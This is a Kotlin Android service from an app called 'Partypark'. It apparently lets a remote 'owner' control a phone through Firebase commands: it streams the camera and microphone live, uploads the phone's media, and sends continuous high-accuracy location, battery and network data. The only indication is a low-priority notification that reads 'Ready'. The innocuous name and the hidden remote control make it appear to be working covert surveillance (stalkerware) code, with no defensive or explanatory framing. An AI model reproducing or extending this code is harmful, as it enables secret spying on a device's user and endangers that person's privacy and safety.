package com.partypark.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import org.webrtc.*

class StreamService : Service() {

    companion object {
        const val CHANNEL_ID = "partypark_stream"
        const val NOTIFICATION_ID = 1
    }

    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var localVideoTrack: VideoTrack? = null
    private var localAudioTrack: AudioTrack? = null
    private var videoCapturer: CameraVideoCapturer? = null
    private var eglBase: EglBase? = null

    private val pendingViewerCandidates = mutableListOf<IceCandidate>()
    private var remoteAnswerSet = false
    private var isFrontCamera = true
    private var flashlightOn = false
    private var isStreaming = false

    private var viewerCandidatesListener: ChildEventListener? = null
    private var answerListener: ValueEventListener? = null
    private var signalingRef: com.google.firebase.database.DatabaseReference? = null

    private val fusedLocationClient by lazy { LocationServices.getFusedLocationProviderClient(this) }
    private var locationCallback: LocationCallback? = null
    private val mediaManager by lazy { MediaManager(this) }

    private var factoryInitialized = false
    private val statusHandler = Handler(Looper.getMainLooper())
    private val statusRunnable = object : Runnable {
        override fun run() {
            updateDeviceStatus()
            statusHandler.postDelayed(this, 15000)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        startLocationUpdates()
        listenForCommands()
        statusHandler.post(statusRunnable)

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun updateDeviceStatus() {
        try {
            val prefs = getSharedPreferences("partypark", Context.MODE_PRIVATE)
            val ownerUid = prefs.getString("ownerUid", null) ?: return
            val deviceId = prefs.getString("deviceId", null) ?: return

            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1

            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)

            var networkType = "unknown"
            var signalBars = 0

            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    networkType = "wifi"
                    signalBars = 4
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    networkType = "mobile"
                    try {
                        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                        val signalStrength = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            telephonyManager.signalStrength?.level ?: 0
                        } else {
                            0
                        }
                        signalBars = signalStrength.coerceIn(0, 4)
                    } catch (e: Exception) {
                        signalBars = 0
                    }
                }
            }

            val status = mapOf(
                "battery" to batteryPct,
                "networkType" to networkType,
                "signalBars" to signalBars,
                "lastSeen" to System.currentTimeMillis()
            )

            Firebase.database.reference
                .child("users")
                .child(ownerUid)
                .child("devices")
                .child(deviceId)
                .updateChildren(status)

        } catch (e: Exception) {
            Log.e("Partypark", "Status update failed", e)
        }
    }

    private fun scanMedia() {
        val prefs = getSharedPreferences("partypark", Context.MODE_PRIVATE)
        val ownerUid = prefs.getString("ownerUid", null) ?: return
        val deviceId = prefs.getString("deviceId", null) ?: return
        mediaManager.scanAndUploadMedia(ownerUid, deviceId) { uploaded, failed ->
            Log.d("Partypark", "Media scan complete: $uploaded uploaded, $failed failed")
        }
    }

    private fun ensureFactory() {
        if (factoryInitialized) return
        val options = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(true)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(options)
        factoryInitialized = true
    }

    private fun startStreaming() {
        cleanupStreaming()

        try {
            val prefs = getSharedPreferences("partypark", Context.MODE_PRIVATE)
            val deviceId = prefs.getString("deviceId", null) ?: return
            signalingRef = Firebase.database.reference.child("signaling").child(deviceId)

            signalingRef?.removeValue()
            remoteAnswerSet = false
            pendingViewerCandidates.clear()

            ensureFactory()

            eglBase = EglBase.create()

            val encoderFactory = DefaultVideoEncoderFactory(eglBase?.eglBaseContext, true, true)
            val decoderFactory = DefaultVideoDecoderFactory(eglBase?.eglBaseContext)

            peerConnectionFactory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory()

            val audioConstraints = MediaConstraints()
            audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
            audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            val audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
            localAudioTrack = peerConnectionFactory?.createAudioTrack("audio", audioSource)
            localAudioTrack?.setEnabled(true)

            videoCapturer = createCameraCapturer()
            if (videoCapturer == null) {
                Log.e("Partypark", "Camera not available")
                return
            }

            val videoSource = peerConnectionFactory?.createVideoSource(false)
            val surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase?.eglBaseContext)
            videoCapturer?.initialize(surfaceTextureHelper, this, videoSource?.capturerObserver)
            videoCapturer?.startCapture(640, 480, 30)
            localVideoTrack = peerConnectionFactory?.createVideoTrack("video", videoSource)

            val iceServers = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
            val rtcConfig = PeerConnection.RTCConfiguration(iceServers)

            peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
                override fun onIceCandidate(candidate: IceCandidate) {
                    signalingRef?.child("senderCandidates")?.push()?.setValue(mapOf(
                        "sdpMid" to candidate.sdpMid,
                        "sdpMLineIndex" to candidate.sdpMLineIndex,
                        "sdp" to candidate.sdp
                    ))
                }
                override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>) {}
                override fun onAddStream(stream: MediaStream) {}
                override fun onRemoveStream(stream: MediaStream) {}
                override fun onDataChannel(p0: DataChannel?) {}
                override fun onIceConnectionReceivingChange(p0: Boolean) {}
                override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {}
                override fun onIceGatheringChange(p0: PeerConnection.IceGatheringState?) {}
                override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
                override fun onRenegotiationNeeded() {}
                override fun onAddTrack(p0: RtpReceiver?, p1: Array<out MediaStream>?) {}
            })

            val streamId = "partypark-live"
            localAudioTrack?.let { peerConnection?.addTrack(it, listOf(streamId)) }
            localVideoTrack?.let { peerConnection?.addTrack(it, listOf(streamId)) }

            viewerCandidatesListener = object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    val mid = snapshot.child("sdpMid").getValue(String::class.java) ?: return
                    val lineIndex = snapshot.child("sdpMLineIndex").getValue(Int::class.java) ?: return
                    val candidateSdp = snapshot.child("sdp").getValue(String::class.java) ?: return
                    val candidate = IceCandidate(mid, lineIndex, candidateSdp)

                    if (remoteAnswerSet) {
                        peerConnection?.addIceCandidate(candidate)
                    } else {
                        pendingViewerCandidates.add(candidate)
                    }
                }
                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onChildRemoved(snapshot: DataSnapshot) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: DatabaseError) {}
            }
            signalingRef?.child("viewerCandidates")?.addChildEventListener(viewerCandidatesListener!!)

            val constraints = MediaConstraints()
            peerConnection?.createOffer(object : SdpObserver {
                override fun onCreateSuccess(sdp: SessionDescription) {
                    peerConnection?.setLocalDescription(object : SdpObserver {
                        override fun onSetSuccess() {
                            signalingRef?.child("offer")?.setValue(mapOf(
                                "type" to sdp.type.canonicalForm(),
                                "sdp" to sdp.description,
                                "ts" to System.currentTimeMillis()
                            ))
                        }
                        override fun onSetFailure(p0: String?) {}
                        override fun onCreateSuccess(p0: SessionDescription?) {}
                        override fun onCreateFailure(p0: String?) {}
                    }, sdp)
                }
                override fun onSetSuccess() {}
                override fun onCreateFailure(p0: String?) {
                    Log.e("Partypark", "Create offer failed: $p0")
                }
                override fun onSetFailure(p0: String?) {}
            }, constraints)

            answerListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val answerMap = snapshot.value as? Map<*, *> ?: return
                    val type = answerMap["type"] as? String ?: return
                    val sdp = answerMap["sdp"] as? String ?: return
                    val answer = SessionDescription(SessionDescription.Type.fromCanonicalForm(type), sdp)
                    peerConnection?.setRemoteDescription(object : SdpObserver {
                        override fun onSetSuccess() {
                            remoteAnswerSet = true
                            pendingViewerCandidates.forEach { candidate ->
                                peerConnection?.addIceCandidate(candidate)
                            }
                            pendingViewerCandidates.clear()
                        }
                        override fun onSetFailure(p0: String?) {}
                        override fun onCreateSuccess(p0: SessionDescription?) {}
                        override fun onCreateFailure(p0: String?) {}
                    }, answer)
                }
                override fun onCancelled(error: DatabaseError) {}
            }
            signalingRef?.child("answer")?.addValueEventListener(answerListener!!)

            isStreaming = true
            Log.d("Partypark", "Streaming started")

        } catch (e: Exception) {
            Log.e("Partypark", "Stream start failed", e)
            cleanupStreaming()
        }
    }

    private fun cleanupStreaming() {
        try {
            viewerCandidatesListener?.let { signalingRef?.child("viewerCandidates")?.removeEventListener(it) }
            answerListener?.let { signalingRef?.child("answer")?.removeEventListener(it) }
        } catch (e: Exception) {}
        viewerCandidatesListener = null
        answerListener = null

        try {
            videoCapturer?.stopCapture()
            videoCapturer?.dispose()
            videoCapturer = null
        } catch (e: Exception) {}

        try {
            peerConnection?.close()
            peerConnection = null
        } catch (e: Exception) {}

        try {
            peerConnectionFactory?.dispose()
            peerConnectionFactory = null
        } catch (e: Exception) {}

        try {
            eglBase?.release()
            eglBase = null
        } catch (e: Exception) {}

        localVideoTrack = null
        localAudioTrack = null
        isStreaming = false
        remoteAnswerSet = false
        pendingViewerCandidates.clear()

        Log.d("Partypark", "Streaming cleaned up")
    }

    private fun listenForCommands() {
        val prefs = getSharedPreferences("partypark", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("deviceId", null) ?: return
        Firebase.database.reference
            .child("commands")
            .child(deviceId)
            .addChildEventListener(object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    val command = snapshot.getValue(String::class.java) ?: return
                    handleCommand(command)
                    snapshot.ref.removeValue()
                }
                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onChildRemoved(snapshot: DataSnapshot) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: DatabaseError) {}
            })
    }

    private fun handleCommand(command: String) {
        when (command) {
            "start_stream" -> startStreaming()
            "stop_stream" -> cleanupStreaming()
            "switch_camera" -> switchCamera()
            "flashlight" -> toggleFlashlight()
            "mic_off" -> localAudioTrack?.setEnabled(false)
            "mic_on" -> localAudioTrack?.setEnabled(true)
            "camera_off" -> localVideoTrack?.setEnabled(false)
            "camera_on" -> localVideoTrack?.setEnabled(true)
            "scan_media" -> scanMedia()
        }
    }

    private fun switchCamera() {
        videoCapturer?.switchCamera(object : CameraVideoCapturer.CameraSwitchHandler {
            override fun onCameraSwitchDone(isFront: Boolean) {
                isFrontCamera = isFront
            }
            override fun onCameraSwitchError(error: String?) {
                Log.e("Partypark", "Camera switch failed: $error")
            }
        })
    }

    private fun toggleFlashlight() {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return
            flashlightOn = !flashlightOn
            cameraManager.setTorchMode(cameraId, flashlightOn)
        } catch (e: Exception) {
            Log.e("Partypark", "Flashlight failed", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        val prefs = getSharedPreferences("partypark", Context.MODE_PRIVATE)
        val ownerUid = prefs.getString("ownerUid", null) ?: return
        val deviceId = prefs.getString("deviceId", null) ?: return

        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000)
            .setMinUpdateIntervalMillis(5000)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                val location = result.lastLocation ?: return
                val locationData = mapOf(
                    "lat" to location.latitude,
                    "lng" to location.longitude,
                    "timestamp" to System.currentTimeMillis()
                )
                Firebase.database.reference
                    .child("users")
                    .child(ownerUid)
                    .child("devices")
                    .child(deviceId)
                    .child("location")
                    .setValue(locationData)
            }
        }

        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback!!, Looper.getMainLooper())
    }

    private fun createCameraCapturer(): CameraVideoCapturer? {
        return try {
            val enumerator = Camera2Enumerator(this)
            for (name in enumerator.deviceNames) {
                if (enumerator.isFrontFacing(name)) {
                    return enumerator.createCapturer(name, null)
                }
            }
            for (name in enumerator.deviceNames) {
                if (!enumerator.isFrontFacing(name)) {
                    return enumerator.createCapturer(name, null)
                }
            }
            null
        } catch (e: Exception) {
            Log.e("Partypark", "Camera capturer failed", e)
            null
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Partypark Streaming",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Partypark")
            .setContentText("Ready")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        statusHandler.removeCallbacks(statusRunnable)
        locationCallback?.let { fusedLocationClient.removeLocationUpdates(it) }
        cleanupStreaming()
    }
}